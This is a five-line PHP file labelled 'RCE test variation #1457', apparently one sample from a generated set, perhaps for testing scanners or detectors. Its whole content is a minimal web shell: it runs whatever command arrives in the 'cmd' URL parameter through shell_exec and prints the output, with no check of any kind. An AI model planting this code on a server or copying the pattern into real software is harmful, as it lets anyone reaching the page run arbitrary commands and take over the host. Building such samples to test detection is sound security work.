<?php
// RCE test variation #1457
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>